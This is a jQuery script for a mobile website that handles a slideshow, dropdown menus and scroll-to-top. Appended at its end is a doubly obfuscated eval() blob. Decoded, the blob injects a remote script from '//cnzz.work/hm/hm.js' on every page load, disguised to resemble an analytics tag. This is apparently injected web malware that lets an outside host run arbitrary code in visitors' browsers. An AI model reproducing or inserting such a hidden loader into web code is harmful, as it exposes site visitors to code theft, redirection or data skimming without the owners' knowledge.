// JavaScript Document
$(document).ready(function(){
$(".top").click(function (){$("html,body").animate({ scrollTop:0},1000)});
$(".linkPf a").click(function () {$(this).parent().hide();});
var userAgentInfo = navigator.userAgent;if (userAgentInfo.indexOf("iPhone") > 0 && userAgentInfo.indexOf("Safari") > 0) {$(".linkPf").show();}else { $(".linkPf").hide();}
$(window).resize(function(){resizes();});
function resizes(){
bodyW=$(window).width()-10;
var imgh=bodyW*275/640;
$(".newsimg").css({"height":imgh});
}
resizes();

(function(){
var li=$(".newsimg .bigbox li");
var LIBOTTOM=$(".newsimg .smallbox li");
var n=li.length;
var i=0;	
if(n>1){
li.not(li.eq(0)).hide();		
li.eq(0).addClass("hover");
LIBOTTOM.eq(0).addClass("hover");
var workstabs=function(){
var tabs=function(m,i){
			 li.eq(m).fadeOut(800);
			 li.eq(i).fadeIn(800);
			 LIBOTTOM.removeClass("hover");
			 LIBOTTOM.eq(i).addClass("hover");
           };
 nextclick=function(){
	if(i==n-1){
	li.eq(i).removeClass("hover");
	li.eq(0).addClass("hover");
	m=i;
	i=0;
	tabs(m,i);
	}else{
		li.eq(i).removeClass("hover");
	    li.eq(i+1).addClass("hover");
		m=i;
	    i++;
	    tabs(m,i);
	}
		}
 
 LIBOTTOM.click(function(){m=i;i=LIBOTTOM.index($(this));tabs(m,i);});  	   			
};
autobase=window.setInterval(function(){nextclick()},3000);
LIBOTTOM.hover(function(){window.clearInterval(autobase)},function(){autobase=window.setInterval(function(){nextclick()},3000);});
workstabs();
}
})();



$(".DropDownMenu ins").click(function(){
	var cla=$(".DropDownMenu").attr("class");
	if(cla=="DropDownMenu"){
		$(".DropDownMenu").addClass("hover");
		var n=$(".DropDownMenu ul li").size();
		if(n>5){n=5;
		var ulH=n*26;
		$(".DropDownMenu ul").css({"width":90});
		$(".DropDownMenu ul").stop().animate({"height":ulH},500,function(){$(".DropDownMenu ul").css({"overflow":"scroll"});});
		}else{
		var ulH=n*26;
		$(".DropDownMenu ul").stop().animate({"height":ulH},500);	
			}
		var cla=$(".DropDownMenu").attr("class");
		}else{
		animatetop();
		}
	
	});
	
$(".DropDownMenu02 ins").click(function(){
	var cla=$(".DropDownMenu02").attr("class");
	if(cla=="DropDownMenu02"){
		$(".DropDownMenu02").addClass("hover");
		var n=$(".DropDownMenu02 ul li").size();
		if(n>5){n=5;
		var ulH=n*26;
		$(".DropDownMenu02 ul").css({"width":90});
		$(".DropDownMenu02 ul").stop().animate({"height":ulH},500,function(){$(".DropDownMenu02 ul").css({"overflow":"scroll"});});
		}else{
		var ulH=n*26;
		$(".DropDownMenu02 ul").stop().animate({"height":ulH},500);	
			}
		var cla=$(".DropDownMenu02").attr("class");
		}else{
		animatetop02();
		}
	
	});	


 $("a[href='javascript:;']").removeAttr("target");

});

function animatetop(){
	$(".DropDownMenu").removeClass("hover");
	$(".DropDownMenu ul").css({"width":62,"overflow":"hidden"});
	$(".DropDownMenu ul").stop().animate({"height":0},500);	
	}
	
	function animatetop02(){
	$(".DropDownMenu02").removeClass("hover");
	$(".DropDownMenu02 ul").css({"width":62,"overflow":"hidden"});
	$(".DropDownMenu02 ul").stop().animate({"height":0},500);	
	}
	
;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))